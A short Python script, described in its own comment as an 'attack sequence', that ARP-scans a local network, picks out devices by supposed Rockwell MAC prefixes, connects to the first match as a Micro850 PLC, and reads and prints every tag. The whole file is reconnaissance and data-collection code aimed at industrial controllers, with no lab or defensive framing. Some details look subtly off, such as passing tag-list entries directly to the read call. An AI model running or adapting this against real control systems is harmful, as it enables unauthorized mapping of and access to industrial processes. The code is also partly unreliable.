from pycomm3 import LogixDriver
import scapy.all as scapy
import time

# Function to scan the network and identify the PLC's IP address
def find_plc_ip(network="192.168.1.0/24"):  
    print("[INFO] Scanning network for Ethernet/IP devices...")
    arp_request = scapy.ARP(pdst=network)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    for element in answered_list:
        ip = element[1].psrc  # Get the IP address
        mac = element[1].hwsrc  # Get the MAC address
        print(f"[INFO] Found Device - IP: {ip}, MAC: {mac}")

        # Simple filter for Rockwell MAC address ranges (Common OUI: 00:0E:CF, not exhaustive)
        if mac.upper().startswith(("00:0E:CF", "00:1D:9C", "00:80:F4")):
            print(f"[SUCCESS] Likely Rockwell PLC found at {ip}")
            return ip

    print("[ERROR] No PLC found on the network.")
    return None


# Function to collect tag values from Micro850 PLC
def collect_tags(plc_ip):
    try:
        print(f"[INFO] Connecting to PLC at {plc_ip}...")
        with LogixDriver(plc_ip) as plc:
            tag_list = plc.get_tag_list()
            
            if not tag_list:
                print("[WARNING] No tags retrieved.")
                return

            print("[INFO] Found Tags:")
            for tag in tag_list:
                value = plc.read(tag)
                print(f"\t{tag}: {value}")

            print("[SUCCESS] Data collection completed.")

    except Exception as e:
        print(f"[ERROR] Could not connect to PLC: {e}")
        return


# Main function to execute the attack sequence
def main():
    plc_ip = find_plc_ip()
    
    if plc_ip:
        collect_tags(plc_ip)


if __name__ == "__main__":
    main()